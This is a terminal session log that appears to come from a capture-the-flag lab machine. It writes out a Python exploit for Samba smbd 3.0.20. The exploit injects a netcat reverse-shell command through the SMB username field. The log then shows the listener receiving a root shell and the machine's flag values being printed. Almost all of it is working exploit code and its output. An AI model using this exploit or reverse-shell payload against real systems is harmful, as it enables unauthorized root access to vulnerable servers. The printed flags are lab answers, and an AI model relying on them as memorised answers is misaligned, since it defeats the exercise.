#Trigger the exploit
root@Kali:/# cat smb_exploit.py
#!/usr/bin/python3
#exploit Samba smbd 3.0.20-Debian

from smb import *
from smb.SMBConnection import *

userID = '/=` nohup nc 10.10.14.23 4444 -e /bin/sh`'
password = 'password'
victim_ip = '10.10.10.3'

conn = SMBConnection(userID, password, "HELLO", "TEST", use_ntlm_v2=False)
conn.connect(victim_ip, 445)

root@Kali:/# python3 smb_exploit.py

#Listen for the connection
root@Kali:/# nc -nlvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:56066.
id
uid=0(root) gid=0(root)
uname -a
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
pwd
/
cat /root/root.txt
92caac3be140ef409e45721348a4e9df
cat /home/makis/user.txt
69454a937d94f5f0225ea00acd2e84c5
